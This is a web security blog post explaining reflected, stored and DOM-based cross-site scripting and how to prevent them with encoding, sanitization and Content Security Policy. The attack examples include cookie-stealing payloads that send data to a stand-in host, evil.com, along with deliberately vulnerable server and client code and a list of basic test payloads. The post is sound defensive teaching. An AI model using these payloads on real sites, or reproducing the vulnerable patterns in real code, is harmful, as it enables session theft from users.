---
layout: post
title: "XSS Attacks Explained: Types and Prevention"
date: "2026-05-26 00:00:00 +0530"
slug: xss-attacks-explained
description: "A practical guide to cross-site scripting (XSS) — the three types of XSS attacks, how each works, and how to prevent them with output encoding, CSP, and sanitization."
categories: ["wiki", "Programming"]
tags: ["xss", "cross-site scripting", "security", "owasp", "web security", "frontend", "csp", "sanitization", "injection"]
---

Cross-site scripting (XSS) lets an attacker run JavaScript in a victim's browser within the context of your application. That means the attacker's script can read cookies, steal session tokens, make authenticated API requests, redirect users, or silently log every keystroke — all while appearing to come from your legitimate site. It's consistently in the OWASP Top 10 because it's easy to introduce and devastating when exploited.

## The Three Types of XSS

### Reflected XSS

The malicious script is embedded in a URL and "reflected" back in the response. The victim clicks a crafted link; the server includes the malicious input in the HTML response; the browser executes it.

```
Attack URL:
https://app.com/search?q=<script>document.location='https://evil.com/steal?c='+document.cookie</script>

Vulnerable server code:
@app.get("/search")
def search(q: str):
    return f"<h1>Results for: {q}</h1>"  # XSS — q is unescaped

Resulting HTML:
<h1>Results for: <script>document.location='https://evil.com/steal?c='+document.cookie</script></h1>
```

The browser executes the script and sends the session cookie to the attacker. The victim just sees a redirect.

### Stored (Persistent) XSS

The malicious script is stored in the database and served to every user who views the affected content. This is the most dangerous type — no crafted link needed.

{% raw %}
```
Attacker submits a comment:
{
  "body": "Great article! <script>fetch('https://evil.com/steal?c='+document.cookie)</script>"
}

Vulnerable render code:
<!-- Every visitor to this article now runs the attacker's script -->
<div class="comment">{{ comment.body }}</div>
```
{% endraw %}

Every user who views the comments page has their cookie stolen. A single stored XSS payload can compromise thousands of sessions.

### DOM-Based XSS

The vulnerability is in client-side JavaScript that writes attacker-controlled data to the DOM without sanitization — the server is never involved.

```javascript
// Vulnerable: reads from URL hash and writes to DOM unsanitized
const name = location.hash.slice(1);  // e.g., #<img src=x onerror=alert(1)>
document.getElementById("greeting").innerHTML = `Hello, ${name}!`;
```

The browser processes `location.hash` entirely client-side. There's no server request to intercept — the payload lives only in the URL fragment.

```
Attack URL:
https://app.com/profile#<img src=x onerror="document.location='https://evil.com/steal?c='+document.cookie">
```

## Prevention: Output Encoding

The primary defense for reflected and stored XSS is **output encoding** — converting special HTML characters into their entity equivalents so the browser renders them as text, not markup.

| Character | HTML Entity |
|-----------|-------------|
| `<` | `&lt;` |
| `>` | `&gt;` |
| `&` | `&amp;` |
| `"` | `&quot;` |
| `'` | `&#x27;` |

Modern frameworks do this automatically when you use template variables correctly:

**React (JSX):** safe by default — JSX encodes all expressions.

{% raw %}
```jsx
// Safe — React encodes this
const Comment = ({ text }) => <div>{text}</div>;

// Dangerous — bypasses encoding
const Comment = ({ text }) => <div dangerouslySetInnerHTML={{ __html: text }} />;
```
{% endraw %}

**Django templates:** auto-escaping is on by default.

{% raw %}
```html
<!-- Safe — Django escapes this -->
<div>{{ comment.body }}</div>

<!-- Dangerous — explicitly disabled -->
<div>{{ comment.body|safe }}</div>
```
{% endraw %}

**Jinja2 / Flask:**

```python
from markupsafe import escape

@app.route("/search")
def search():
    q = request.args.get("q", "")
    # escape() converts < to &lt; etc.
    return f"<h1>Results for: {escape(q)}</h1>"
```

**The golden rule:** never use `innerHTML`, `dangerouslySetInnerHTML`, `document.write`, or template `|safe` filters with untrusted data.

## Sanitization for Rich Text

Sometimes you need to accept and display HTML — a rich text editor, a CMS, markdown-rendered content. In this case, you can't just encode everything. You need to sanitize: allow safe tags, strip dangerous ones.

```python
import bleach

ALLOWED_TAGS = ["p", "br", "strong", "em", "ul", "ol", "li", "a", "blockquote", "code"]
ALLOWED_ATTRS = {"a": ["href", "title"], "img": ["src", "alt"]}

def sanitize_html(html: str) -> str:
    return bleach.clean(
        html,
        tags=ALLOWED_TAGS,
        attributes=ALLOWED_ATTRS,
        strip=True
    )
```

```python
user_html = '<p>Hello <script>alert(1)</script> world <strong>bold</strong></p>'
print(sanitize_html(user_html))
# → <p>Hello  world <strong>bold</strong></p>
```

In JavaScript, use DOMPurify:

```javascript
import DOMPurify from 'dompurify';

// Safe way to render user HTML
element.innerHTML = DOMPurify.sanitize(userHtml);
```

DOMPurify is battle-tested and handles hundreds of XSS edge cases that a hand-rolled allowlist would miss.

## DOM XSS Prevention

Avoid writing user-controlled data to the DOM via dangerous sink APIs:

```javascript
// Dangerous sinks — never pass untrusted data to these
element.innerHTML = userInput;
element.outerHTML = userInput;
document.write(userInput);
eval(userInput);
setTimeout(userInput);

// Safe alternatives
element.textContent = userInput;    // always text, never HTML
element.setAttribute("data-x", userInput);
```

For URL-based data, validate the scheme:

```javascript
function safeRedirect(url) {
    const parsed = new URL(url, window.location.origin);
    if (parsed.protocol !== 'https:' && parsed.protocol !== 'http:') {
        throw new Error('Invalid URL scheme');
    }
    window.location.href = parsed.toString();
}

// Blocks: javascript:alert(1), data:text/html,...
```

## Content Security Policy (CSP)

CSP is a defense-in-depth mechanism — even if an XSS vulnerability exists, CSP can prevent the injected script from executing or phoning home.

Set via HTTP header:

```nginx
add_header Content-Security-Policy "
    default-src 'self';
    script-src 'self' https://cdn.trusted.com;
    style-src 'self' 'unsafe-inline';
    img-src 'self' data: https:;
    connect-src 'self' https://api.example.com;
    frame-ancestors 'none';
" always;
```

With this policy, even if an attacker injects `<script>`, the browser won't execute it — `script-src 'self'` only allows scripts from your own origin.

**`'unsafe-inline'` is the CSP killer:** many sites add it to make inline `<script>` and `style` tags work, which negates most of CSP's XSS protection. Use nonces or hashes instead:

```html
<!-- Server generates a fresh nonce per request -->
<script nonce="r4nd0m-n0nc3">
    // This inline script is allowed because the nonce matches
</script>
```

```nginx
# Nonce in CSP must match the nonce in the HTML
add_header Content-Security-Policy "script-src 'nonce-r4nd0m-n0nc3' 'strict-dynamic'";
```

## Testing for XSS

```bash
# Basic payloads to test in all user-controlled inputs:
<script>alert(1)</script>
<img src=x onerror=alert(1)>
"><script>alert(1)</script>
javascript:alert(1)
<svg onload=alert(1)>

# Check if CSP is set and its value
$ curl -I https://yourapp.com | grep -i content-security-policy
content-security-policy: default-src 'self'; script-src 'self'
```

Tools like OWASP ZAP and Burp Suite automate XSS scanning. Run them against your app in a test environment before each major release.

## Conclusion

XSS prevention comes down to three disciplines: encode output by default (let your framework do this, and never bypass it with `|safe` or `innerHTML`), sanitize rich text with a proven library like DOMPurify or bleach rather than a hand-rolled allowlist, and add CSP as a defense-in-depth layer so that even if an XSS payload slips through, the browser won't execute it. The most common mistake is thinking that stored data is safe because it was "validated on input" — validation and encoding are separate concerns, and both are necessary.
